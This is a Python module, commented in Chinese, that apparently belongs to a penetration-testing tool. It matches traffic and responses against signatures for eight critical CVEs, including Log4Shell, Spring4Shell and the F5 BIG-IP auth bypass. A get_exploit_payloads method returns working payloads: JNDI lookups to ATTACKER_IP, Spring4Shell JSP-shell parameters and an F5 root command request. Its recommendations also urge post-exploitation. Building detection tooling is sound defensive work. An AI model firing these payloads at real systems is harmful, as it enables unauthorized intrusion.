"""
高危險 CVE 識別模組

基於 AI 識別高危險 CVE 模組.md 的專業知識，
提供已知高危漏洞的自動化識別能力。

支援的 CVE:
    - CVE-2021-44228 (Log4Shell)
    - CVE-2022-22965 (Spring4Shell)
    - CVE-2022-26134 (Confluence OGNL)
    - CVE-2021-34473/34523/31207 (ProxyShell)
    - CVE-2022-1388 (F5 BIG-IP)
    - CVE-2023-4966 (Citrix Bleed)
    - CVE-2024-23897 (Jenkins CLI)
    - CVE-2023-46805 & CVE-2024-21887 (Ivanti Chain)

檢測信號層級:
    - Tier 1: 絕對確認指標 (Absolute Confirmation)
    - Tier 2: 確定性載荷 (Deterministic Payloads)
    - Tier 3: 概率性觸發 (Probabilistic Triggers)
"""

from dataclasses import dataclass, field
from enum import Enum, auto
import re
from typing import Any

from .base import (
    ConfidenceLevel,
    KnowledgeRegistry,
)


class SignalTier(Enum):
    """檢測信號層級"""
    TIER_1_ABSOLUTE = auto()      # 絕對確認 - 不可否認的證據
    TIER_2_DETERMINISTIC = auto() # 確定性 - 高可信度攻擊特徵
    TIER_3_PROBABILISTIC = auto() # 概率性 - 僅表明組件存在


@dataclass
class CVESignature:
    """CVE 檢測簽名"""
    cve_id: str
    name: str
    cvss_score: float
    vulnerability_type: str
    affected_components: list[str]
    
    # 檢測模式
    tier3_triggers: list[str]       # URL 路徑、Header 等概率性觸發
    tier2_payloads: list[str]       # 惡意 payload 特徵 (正則)
    tier1_indicators: dict[str, list[str]]  # 確認指標分類
    
    # 利用信息
    exploit_method: str
    required_conditions: list[str]
    
    def to_dict(self) -> dict[str, Any]:
        return {
            "cve_id": self.cve_id,
            "name": self.name,
            "cvss_score": self.cvss_score,
            "vulnerability_type": self.vulnerability_type,
            "affected_components": self.affected_components,
        }


@dataclass
class CVEMatch:
    """CVE 匹配結果"""
    cve_id: str
    name: str
    cvss_score: float
    signal_tier: SignalTier
    confidence: ConfidenceLevel
    confidence_score: float
    matched_triggers: list[str]
    matched_payloads: list[str]
    matched_indicators: list[str]
    evidence: list[str]
    exploit_recommendations: list[str]
    raw_data: dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> dict[str, Any]:
        return {
            "cve_id": self.cve_id,
            "name": self.name,
            "cvss_score": self.cvss_score,
            "signal_tier": self.signal_tier.name,
            "confidence": self.confidence.name,
            "confidence_score": self.confidence_score,
            "matched_triggers": self.matched_triggers,
            "evidence": self.evidence,
            "exploit_recommendations": self.exploit_recommendations,
        }
    
    def is_exploitable(self) -> bool:
        """判斷是否可利用"""
        return self.signal_tier in [SignalTier.TIER_1_ABSOLUTE, SignalTier.TIER_2_DETERMINISTIC]


class CVEIdentifier:
    """
    高危 CVE 識別器
    
    提供自動化的高危 CVE 識別能力，
    基於三層信號架構進行精確判斷。
    
    使用範例:
        # 識別目標是否存在已知 CVE
        matches = CVEIdentifier.identify(
            url="/autodiscover/autodiscover.json",
            headers={"X-F5-Auth-Token": "test"},
            response_body="...",
        )
        
        for match in matches:
            if match.is_exploitable():
                print(f"Found {match.cve_id} - {match.name}")
    """
    
    # ==================== CVE 簽名資料庫 ====================
    
    CVE_DATABASE: dict[str, CVESignature] = {
        "CVE-2021-44228": CVESignature(
            cve_id="CVE-2021-44228",
            name="Log4Shell",
            cvss_score=10.0,
            vulnerability_type="Remote Code Execution",
            affected_components=["Apache Log4j 2.0-beta9 to 2.14.1"],
            tier3_triggers=[
                r"/api/",
                r"/login",
                r"/search",
            ],
            tier2_payloads=[
                r"\$\{jndi:(ldap|rmi|dns|iiop|ldaps)://[^\}]+\}",
                r"\$\{\$\{lower:j\}ndi:",
                r"\$\{lower:l\}\{lower:d\}a\{lower:p\}",
                r"\$\{::-j\}ndi",
                r"\$\{env:[^}]+\}",
            ],
            tier1_indicators={
                "network_outbound": [
                    "LDAP connection to external IP on port 389/636/1389",
                    "RMI connection to external IP on port 1099",
                    "DNS query to attacker-controlled domain",
                ],
                "oast_callback": [
                    "DNS resolution of unique canary domain",
                    "HTTP callback to interact.sh or similar",
                ],
            },
            exploit_method="JNDI Lookup injection in logged data",
            required_conditions=[
                "Log4j 2.x in vulnerable version range",
                "User input logged by application",
            ],
        ),
        
        "CVE-2022-22965": CVESignature(
            cve_id="CVE-2022-22965",
            name="Spring4Shell",
            cvss_score=9.8,
            vulnerability_type="Remote Code Execution",
            affected_components=[
                "Spring Framework 5.3.0-5.3.17",
                "Spring Framework 5.2.0-5.2.19",
                "JDK 9+",
                "Tomcat as WAR deployment",
            ],
            tier3_triggers=[
                r"/login",
                r"/register",
                r"/submit",
                r"/api/.*",
            ],
            tier2_payloads=[
                r"class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.pattern=",
                r"class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.suffix=\.jsp",
                r"class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.directory=",
                r"class\.module\.classLoader\.resources\.context\.parent\.pipeline\.first\.prefix=",
            ],
            tier1_indicators={
                "filesystem": [
                    "New .jsp file in webapps/ROOT",
                    "tomcatwar.jsp created",
                ],
                "http_response": [
                    "Access to new .jsp returns 200 with command output",
                    "Web shell responds to cmd parameter",
                ],
            },
            exploit_method="ClassLoader manipulation via data binding",
            required_conditions=[
                "JDK 9 or higher",
                "Spring MVC with data binding",
                "Deployed as WAR on Tomcat",
            ],
        ),
        
        "CVE-2022-26134": CVESignature(
            cve_id="CVE-2022-26134",
            name="Atlassian Confluence OGNL Injection",
            cvss_score=9.8,
            vulnerability_type="Remote Code Execution",
            affected_components=["Confluence Server and Data Center"],
            tier3_triggers=[
                r"/wiki/",
                r"/confluence/",
                r"/pages/",
            ],
            tier2_payloads=[
                r"\$\{@java\.lang\.Runtime@getRuntime\(\)\.exec\(",
                r"%24%7B%40java\.lang\.Runtime",
                r"Class\.forName\(",
                r"getRuntime\(\)\.exec",
            ],
            tier1_indicators={
                "response_header": [
                    "Custom header X-Cmd-Response with system info",
                    "X-Qualys-Response header present",
                ],
                "process_creation": [
                    "Java process spawns shell (bash/sh/cmd)",
                ],
            },
            exploit_method="OGNL expression injection in URL path",
            required_conditions=[
                "Confluence in vulnerable version",
                "No WAF blocking OGNL syntax",
            ],
        ),
        
        "CVE-2021-34473": CVESignature(
            cve_id="CVE-2021-34473",
            name="Microsoft Exchange ProxyShell",
            cvss_score=9.8,
            vulnerability_type="Auth Bypass + RCE Chain",
            affected_components=["Microsoft Exchange Server 2013/2016/2019"],
            tier3_triggers=[
                r"/autodiscover/autodiscover\.json",
                r"/mapi/nspi",
                r"/powershell",
                r"/owa/",
                r"/ecp/",
            ],
            tier2_payloads=[
                r"/autodiscover/autodiscover\.json\?.*@[^/]+/",
                r"Email=autodiscover/autodiscover\.json",
                r"X-Rps-CAT",
            ],
            tier1_indicators={
                "filesystem": [
                    "New .aspx file in /aspnet_client/",
                    "Web shell in Exchange directory",
                ],
                "powershell_log": [
                    "New-MailboxExportRequest with .aspx FilePath",
                ],
                "http_response": [
                    "Unauthorized access to /mapi/nspi returns 200",
                ],
            },
            exploit_method="Path confusion + privilege escalation + file write",
            required_conditions=[
                "Exchange Server unpatched",
                "External access to /autodiscover",
            ],
        ),
        
        "CVE-2022-1388": CVESignature(
            cve_id="CVE-2022-1388",
            name="F5 BIG-IP iControl REST Auth Bypass",
            cvss_score=9.8,
            vulnerability_type="Authentication Bypass + RCE",
            affected_components=["F5 BIG-IP multiple versions"],
            tier3_triggers=[
                r"/mgmt/tm/",
                r"/mgmt/shared/",
            ],
            tier2_payloads=[
                r"Connection:\s*X-F5-Auth-Token",
                r"X-F5-Auth-Token:\s*\S+",
                r"/mgmt/tm/util/bash",
                r'"command":\s*"run"',
                r'"utilCmdArgs"',
            ],
            tier1_indicators={
                "response_body": [
                    '"commandResult" containing "uid=0(root)"',
                    "Command execution output in JSON",
                ],
                "status_code": [
                    "200 OK on /mgmt/tm/util/bash without valid auth",
                ],
            },
            exploit_method="Hop-by-Hop header abuse to bypass auth",
            required_conditions=[
                "F5 BIG-IP management interface accessible",
                "Vulnerable firmware version",
            ],
        ),
        
        "CVE-2023-4966": CVESignature(
            cve_id="CVE-2023-4966",
            name="Citrix NetScaler Bleed",
            cvss_score=9.4,
            vulnerability_type="Information Disclosure / Session Hijack",
            affected_components=["NetScaler ADC", "NetScaler Gateway"],
            tier3_triggers=[
                r"/oauth/idp/\.well-known/openid-configuration",
                r"/vpn/",
                r"/logon/LogonPoint/",
            ],
            tier2_payloads=[
                r"Host:\s*.{20000,}",  # 超長 Host header
            ],
            tier1_indicators={
                "response_content": [
                    "Response contains binary memory dump",
                    "Response size significantly larger than normal",
                ],
                "session_token": [
                    "NSC_AAAC= followed by 32-65 hex characters",
                    "Session token leaked in response",
                ],
            },
            exploit_method="Buffer over-read via oversized Host header",
            required_conditions=[
                "NetScaler configured as Gateway or AAA server",
                "Access to OpenID configuration endpoint",
            ],
        ),
        
        "CVE-2024-23897": CVESignature(
            cve_id="CVE-2024-23897",
            name="Jenkins CLI Arbitrary File Read",
            cvss_score=9.8,
            vulnerability_type="Arbitrary File Read / RCE",
            affected_components=["Jenkins 2.441 and earlier", "LTS 2.426.2 and earlier"],
            tier3_triggers=[
                r"/cli\?remoting=false",
                r"/cli",
            ],
            tier2_payloads=[
                r"@/etc/passwd",
                r"@/var/jenkins_home/secrets/",
                r"@C:\\",
                r"connect-node",
            ],
            tier1_indicators={
                "response_body": [
                    "File content in error message (e.g., root:x:0:0)",
                    "Jenkins secret key content",
                ],
            },
            exploit_method="args4j @file argument expansion",
            required_conditions=[
                "Jenkins CLI endpoint accessible",
                "Default expandAtFiles enabled",
            ],
        ),
        
        "CVE-2023-46805": CVESignature(
            cve_id="CVE-2023-46805",
            name="Ivanti Connect Secure Auth Bypass Chain",
            cvss_score=9.1,
            vulnerability_type="Auth Bypass + RCE",
            affected_components=["Ivanti Connect Secure 9.x, 22.x", "Ivanti Policy Secure"],
            tier3_triggers=[
                r"/api/v1/totp/",
                r"/api/v1/license/",
                r"/dana-na/",
            ],
            tier2_payloads=[
                r"/api/v1/totp/user-backup-code/\.\./",
                r"/api/v1/license/keys-status/\.\./",
                r"python\s+-c\s+'import\s+socket",
            ],
            tier1_indicators={
                "response_body": [
                    "Unauthorized access returns system-information JSON",
                    "serial-number, hostname exposed without auth",
                ],
                "network_outbound": [
                    "Reverse shell connection initiated",
                ],
            },
            exploit_method="Path traversal to bypass auth + command injection",
            required_conditions=[
                "Ivanti Connect Secure in vulnerable version",
                "External access to API endpoints",
            ],
        ),
    }
    
    # ==================== 識別方法 ====================
    
    @classmethod
    def identify(
        cls,
        url: str = "",
        headers: dict[str, str] | None = None,
        request_body: str = "",
        response_body: str = "",
        response_headers: dict[str, str] | None = None,
        oast_callbacks: list[str] | None = None,
    ) -> list[CVEMatch]:
        """
        識別目標中的已知高危 CVE
        
        基於三層信號架構進行檢測：
        - Tier 3: 檢查 URL/Header 是否匹配已知組件特徵
        - Tier 2: 檢查請求是否包含已知攻擊 payload
        - Tier 1: 檢查響應是否包含確認指標
        
        Args:
            url: 請求 URL
            headers: 請求 headers
            request_body: 請求體
            response_body: 響應體
            response_headers: 響應 headers
            oast_callbacks: OAST 回調記錄
            
        Returns:
            匹配的 CVE 列表，按置信度排序
        """
        headers = headers or {}
        response_headers = response_headers or {}
        oast_callbacks = oast_callbacks or []
        
        matches: list[CVEMatch] = []
        
        for cve_id, signature in cls.CVE_DATABASE.items():
            match = cls._check_single_cve(
                signature=signature,
                url=url,
                headers=headers,
                request_body=request_body,
                response_body=response_body,
                response_headers=response_headers,
                oast_callbacks=oast_callbacks,
            )
            if match:
                matches.append(match)
        
        # 按置信度排序
        matches.sort(key=lambda m: m.confidence_score, reverse=True)
        
        return matches
    
    @classmethod
    def identify_by_fingerprint(
        cls,
        server_header: str = "",
        technology_stack: list[str] | None = None,
        exposed_paths: list[str] | None = None,
    ) -> list[CVESignature]:
        """
        根據技術指紋識別潛在的 CVE
        
        用於偵查階段，根據已知的技術棧返回可能存在的 CVE
        
        Args:
            server_header: Server header 內容
            technology_stack: 已識別的技術棧
            exposed_paths: 已發現的 URL 路徑
            
        Returns:
            可能存在的 CVE 簽名列表
        """
        technology_stack = technology_stack or []
        exposed_paths = exposed_paths or []
        
        potential_cves: list[CVESignature] = []
        
        # 基於技術棧匹配
        tech_keywords = {
            "CVE-2021-44228": ["log4j", "java", "spring"],
            "CVE-2022-22965": ["spring", "tomcat", "java"],
            "CVE-2022-26134": ["confluence", "atlassian"],
            "CVE-2021-34473": ["exchange", "microsoft", "owa"],
            "CVE-2022-1388": ["f5", "big-ip", "bigip"],
            "CVE-2023-4966": ["citrix", "netscaler", "gateway"],
            "CVE-2024-23897": ["jenkins"],
            "CVE-2023-46805": ["ivanti", "pulse", "connect secure"],
        }
        
        for cve_id, keywords in tech_keywords.items():
            for keyword in keywords:
                # 檢查技術棧
                if any(keyword.lower() in tech.lower() for tech in technology_stack):
                    potential_cves.append(cls.CVE_DATABASE[cve_id])
                    break
                # 檢查 Server header
                if keyword.lower() in server_header.lower():
                    potential_cves.append(cls.CVE_DATABASE[cve_id])
                    break
        
        # 基於路徑匹配
        for cve_id, signature in cls.CVE_DATABASE.items():
            for trigger in signature.tier3_triggers:
                for path in exposed_paths:
                    if re.search(trigger, path, re.IGNORECASE):
                        if signature not in potential_cves:
                            potential_cves.append(signature)
                        break
        
        return potential_cves
    
    @classmethod
    def get_exploit_payloads(cls, cve_id: str) -> dict[str, Any]:
        """
        獲取指定 CVE 的利用 payload
        
        Args:
            cve_id: CVE 編號
            
        Returns:
            包含 payloads、headers、目標 URL 的字典
        """
        signature = cls.CVE_DATABASE.get(cve_id)
        if not signature:
            return {}
        
        result = {
            "cve_id": cve_id,
            "name": signature.name,
            "detection_payloads": signature.tier2_payloads,
            "trigger_paths": signature.tier3_triggers,
            "confirmation_indicators": signature.tier1_indicators,
            "exploit_method": signature.exploit_method,
            "required_conditions": signature.required_conditions,
        }
        
        # 添加特定 CVE 的利用 payload
        if cve_id == "CVE-2021-44228":
            result["exploit_payloads"] = [
                "${jndi:ldap://ATTACKER_IP:1389/exploit}",
                "${jndi:rmi://ATTACKER_IP:1099/exploit}",
                "${jndi:dns://ATTACKER_DOMAIN}",
                "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://ATTACKER_IP/x}",
            ]
            result["injection_points"] = [
                "User-Agent", "X-Forwarded-For", "Referer",
                "Username field", "Search parameters", "Any logged input"
            ]
        
        elif cve_id == "CVE-2022-22965":
            result["exploit_payloads"] = [
                "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i",
                "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
                "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
                "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell",
            ]
        
        elif cve_id == "CVE-2022-1388":
            result["exploit_payloads"] = [{
                "method": "POST",
                "path": "/mgmt/tm/util/bash",
                "headers": {
                    "Authorization": "Basic YWRtaW46",
                    "X-F5-Auth-Token": "anything",
                    "Connection": "X-F5-Auth-Token",
                    "Host": "localhost",
                },
                "body": '{"command": "run", "utilCmdArgs": "-c id"}',
            }]
        
        return result
    
    # ==================== 內部方法 ====================
    
    @classmethod
    def _check_single_cve(
        cls,
        signature: CVESignature,
        url: str,
        headers: dict[str, str],
        request_body: str,
        response_body: str,
        response_headers: dict[str, str],
        oast_callbacks: list[str],
    ) -> CVEMatch | None:
        """檢查單個 CVE"""
        matched_triggers: list[str] = []
        matched_payloads: list[str] = []
        matched_indicators: list[str] = []
        evidence: list[str] = []
        
        signal_tier = SignalTier.TIER_3_PROBABILISTIC
        confidence = ConfidenceLevel.UNCERTAIN
        
        # === Tier 3: 概率性觸發檢查 ===
        for trigger in signature.tier3_triggers:
            if re.search(trigger, url, re.IGNORECASE):
                matched_triggers.append(trigger)
                evidence.append(f"URL matches trigger pattern: {trigger}")
        
        # === Tier 2: 確定性 Payload 檢查 ===
        full_request = f"{url}\n{str(headers)}\n{request_body}"
        for payload_pattern in signature.tier2_payloads:
            if re.search(payload_pattern, full_request, re.IGNORECASE):
                matched_payloads.append(payload_pattern)
                signal_tier = SignalTier.TIER_2_DETERMINISTIC
                confidence = ConfidenceLevel.HIGH
                evidence.append(f"Request contains attack payload: {payload_pattern}")
        
        # === Tier 1: 絕對確認指標檢查 ===
        full_response = f"{str(response_headers)}\n{response_body}"
        
        for category, indicators in signature.tier1_indicators.items():
            for indicator in indicators:
                # 檢查響應
                if indicator.lower() in full_response.lower():
                    matched_indicators.append(indicator)
                    signal_tier = SignalTier.TIER_1_ABSOLUTE
                    confidence = ConfidenceLevel.ABSOLUTE
                    evidence.append(f"Response contains confirmation indicator: {indicator}")
                
                # 檢查 OAST 回調
                if category in ["oast_callback", "network_outbound"]:
                    for callback in oast_callbacks:
                        if any(kw in callback.lower() for kw in ["dns", "ldap", "rmi", "http"]):
                            matched_indicators.append(f"OAST: {callback}")
                            signal_tier = SignalTier.TIER_1_ABSOLUTE
                            confidence = ConfidenceLevel.ABSOLUTE
                            evidence.append(f"OAST callback received: {callback}")
        
        # === 判斷是否返回匹配 ===
        if not matched_triggers and not matched_payloads and not matched_indicators:
            return None
        
        # 構建利用建議
        recommendations = cls._build_exploit_recommendations(
            signature, signal_tier, matched_indicators
        )
        
        return CVEMatch(
            cve_id=signature.cve_id,
            name=signature.name,
            cvss_score=signature.cvss_score,
            signal_tier=signal_tier,
            confidence=confidence,
            confidence_score=confidence.to_score(),
            matched_triggers=matched_triggers,
            matched_payloads=matched_payloads,
            matched_indicators=matched_indicators,
            evidence=evidence,
            exploit_recommendations=recommendations,
            raw_data={
                "vulnerability_type": signature.vulnerability_type,
                "affected_components": signature.affected_components,
                "exploit_method": signature.exploit_method,
            },
        )
    
    @classmethod
    def _build_exploit_recommendations(
        cls,
        signature: CVESignature,
        signal_tier: SignalTier,
        matched_indicators: list[str],
    ) -> list[str]:
        """構建利用建議"""
        recommendations = []
        
        if signal_tier == SignalTier.TIER_1_ABSOLUTE:
            recommendations.append(f"CONFIRMED: {signature.cve_id} ({signature.name}) exploited successfully")
            recommendations.append("DOCUMENT: Capture all evidence for report")
            recommendations.append("ESCALATE: Proceed to post-exploitation")
            
        elif signal_tier == SignalTier.TIER_2_DETERMINISTIC:
            recommendations.append(f"DETECTED: Attack payload for {signature.cve_id} in traffic")
            recommendations.append("VERIFY: Check for confirmation indicators in response")
            recommendations.append("OAST: Use out-of-band testing to confirm")
            
        else:  # TIER_3
            recommendations.append(f"POTENTIAL: Target may be vulnerable to {signature.cve_id}")
            recommendations.append("PROBE: Send detection payloads to confirm")
            recommendations.append(f"METHOD: {signature.exploit_method}")
        
        return recommendations
    
    # ==================== 註冊擴展 ====================
    
    @classmethod
    def register_cve(cls, signature: CVESignature) -> None:
        """
        註冊新的 CVE 簽名
        
        允許動態添加新的 CVE 檢測能力
        """
        cls.CVE_DATABASE[signature.cve_id] = signature
        
        # 同步到 KnowledgeRegistry
        registry = KnowledgeRegistry()
        registry.register_cve_pattern(signature.cve_id, signature.to_dict())
    
    @classmethod
    def get_all_cve_ids(cls) -> list[str]:
        """獲取所有支援的 CVE ID"""
        return list(cls.CVE_DATABASE.keys())
    
    @classmethod
    def get_cve_by_severity(cls, min_cvss: float = 9.0) -> list[CVESignature]:
        """根據 CVSS 分數篩選 CVE"""
        return [
            sig for sig in cls.CVE_DATABASE.values()
            if sig.cvss_score >= min_cvss
        ]
